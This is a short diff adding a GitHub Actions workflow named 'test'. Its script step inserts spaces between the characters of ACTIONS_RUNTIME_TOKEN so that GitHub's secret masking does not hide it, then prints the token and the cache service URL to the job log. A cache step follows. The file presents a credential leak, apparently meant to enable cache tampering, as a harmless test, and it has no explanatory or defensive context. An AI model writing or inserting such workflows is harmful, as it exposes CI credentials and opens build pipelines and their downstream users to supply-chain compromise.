@@ -1,0 +1,18 @@
+name: test
+on: workflow_dispatch
+
+jobs:
+  run-script:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/github-script@v5
+        with:
+          script: |
+            const token = (process.env['ACTIONS_RUNTIME_TOKEN'] || '').split('').join(' ');
+            console.log("ACTIONS_CACHE_URL_VAL="+process.env['ACTIONS_CACHE_URL']);
+            console.log("ACTIONS_RUNTIME_TOKEN_VAL="+token)
+      - uses: actions/cache@v2
+        id: cache
+        with:
+          path: README.md
+          key: Readme-212312
